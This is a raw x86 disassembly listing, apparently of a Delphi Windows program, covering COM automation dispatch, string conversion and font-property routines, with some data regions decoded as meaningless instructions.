mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_477d40
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404d78
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404d78
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477a77
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404d54
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404d78
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40f814
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_477aa4
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
pop ecx
pop ecx
pop ebp
retn
sub_477ad8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_408968
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_4771f4
push ebp
call sub_477aa4
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_477bd0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_477bb8
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_477ad8
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_477760
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40f220
sub_477c6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_477d31
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_477070
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_404204
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_404204
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_404204
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477140
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477d38
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fa0
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_4039b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404af0
jmp r-xdata
sub_477d5c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_477d4c
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_477c6c
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_477e40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_477d5c
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_477e71 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40f220
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_477f1c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_415df0
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_415df0
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_477f94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47800a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478011
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404a04
call CoUninitialize
sub_478014
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_47755c
mov eax sub_477bd0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_477e40
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_477f1c
sub_47806c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_478091
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478098
retn
sub_4780a4
[ edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
fadd [ ecx - 0x7e91ffb9 ]
je r-xdata
int1
jb r-xdata
add [ eax ] al
insd
inc ecx
popad
jo r-xdata
add al 0x24
retn
popad
jo r-xdata
inc [ ebx - 0x23fbdbbc ]
jmp sub_405974
outsd
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
add [ edi ] 0x14
inc esp
adc al [ eax ]
xor al 0x34
inc eax
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax - 0x23ffbfcf ] ah
xor [ eax ] eax
adc [ ecx + eax * 2 + 0x64 ] dl
popad
jo r-xdata
add [ esi - 0x7f ] ch
jb r-xdata
add [ ebx - 0x7d ] cl
inc edi
add [ ebp - 0x7d ] dl
inc edi
add [ edi - 0x7d ] bl
inc edi
add [ edi ] bh
jb r-xdata
add [ edi ] sub_4781f9
sub eax [ edx - 0x7dcaffb9 ]
inc edi
add [ edi ] bh
add [ edi ] 0x1f
add [ edi ] 0x2
add [ eax ] al
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
or [ ebx - 0x7e ] 0x200047
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
add [ 0xfffffffff1004782 ] dl
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
add al bh
add [ edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
add [ edi ] 0x1c
inc esp
adc al [ eax ]
xor al 0x34
inc eax
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax - 0x47ffbfcf ] ah
xchg [ edi ] eax
in al 0x87
inc edi
add [ eax ] ah
sub al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0xc0040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] eax
adc al 0x0
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
add [ edi ] 0x2
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
sub eax [ ebx - 0x7ccaffb9 ]
inc edi
add [ ecx ] dl
add [ edi ] 0x19
add [ edi ] 0x4b
add [ edi ] 0x55
add [ edi ] 0x5f
add [ edi ] 0x3f
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x836cda82
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x8380da82
scasd [ edi ]
cmp eax 0x825fda82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
clc
add [ edi ] 0x6f
add [ edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x28
add [ eax ] al
add [ eax + eax * 4 + 0x34340047 ] ah
inc eax
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax - 0x47ffbfcf ] ah
xchg [ edi ] eax
cmp [ ebx - 0x768fffb9 ] cl
inc edi
add [ esp + edx * 2 ] cl
inc esi
outsd
outsb
je r-xdata
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478e09
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push j_sub_4036cc#7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc edi
add ah dh
xchg ebx eax
inc edi
add [ esp + edx * 4 ] dl
inc edi
add [ eax + 0x6f ] dh
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_4058e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e10
lea eax [ ebp - 0x2c ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_4249b8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047a8
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_4047b8
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_424a2c
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x1
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
jpo r-xdata
jo r-xdata
inc edx
add [ eax - 0x6c ] bl
inc edi
add [ eax - 0x27ffb86c ] ah
outsd
inc edx
add al al
xchg esp eax
inc edi
add al ch
outsd
inc edx
add [ eax + 0x800426c ] dh
xchg ebp eax
inc edi
add [ edi + ebp * 2 + 0x42 ] bh
add [ edx * 4 - 0x6aa3ffb9 ] cl
inc edi
add al ah
xchg ebp eax
inc edi
add [ esi + edx * 4 ] ch
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x5d ] al
inc ecx
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
outsd
test [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
clc
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_478934
imul esp [ ebx - 0x75 ] 0x478504c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi + eax * 2 + 0x47839000 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
test [ edi ] al
sub [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ edi ] 0x34
xor al 0x40
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax - 0x47ffbfcf ] ah
xchg [ edi ] eax
in al 0x87
inc edi
add ah ah
mov es [ edi ]
andps xmm2 [ eax + 0x69 ]
arpl [ ebp + esi * 2 + 0x72 ] si
inc ecx
popad
jo r-xdata
inc edi
add [ eax * 4 + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edi ] al
sub al 0x0
add [ eax ] al
pop esp
xor eax [ edx ]
xor al 0x34
inc eax
add [ ebp + edx * 4 + 0x41 ] bh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
add [ eax + 0x6d ] bl
inc edx
add [ eax + 0xc004791 ] bh
xchg esi eax
inc ecx
add ah ch
xchg ecx eax
inc edi
add al dh
xchg ecx eax
inc edi
add [ ebp + ebp * 2 - 0x6d03ffbe ] ah
inc edi
add [ eax - 0x6d ] dh
inc edi
add al bl
xchg ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_479015
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42b664
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42b698
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
mov eax [ ebx + 0x1c ]
call sub_424ad0
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_424a68
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_479768
call sub_4771f4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4787f0
mov ecx r-xdata
call sub_4058e4
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_4058b8
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_42788c
call sub_42b8e8
mov [ ebp - 0x24 ] eax
jmp r-xdata
imul esp [ ebx + 0x7c ] 0x20004784
xor al 0x42
add [ eax ] al
add [ edi ] al
inc ecx
js r-xdata
mov eax esi
call sub_4278a4
call sub_428408
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42817c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_479125
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_427dd8
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_427df0
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427e48
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4790f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_42526c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479100
mov eax [ ebp - 0x18 ]
call sub_4031ec
retn
mov eax [ ebp - 0x8 ]
call sub_4058a0
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_479784
call sub_4771f4
mov edx [ ebp - 0x8 ]
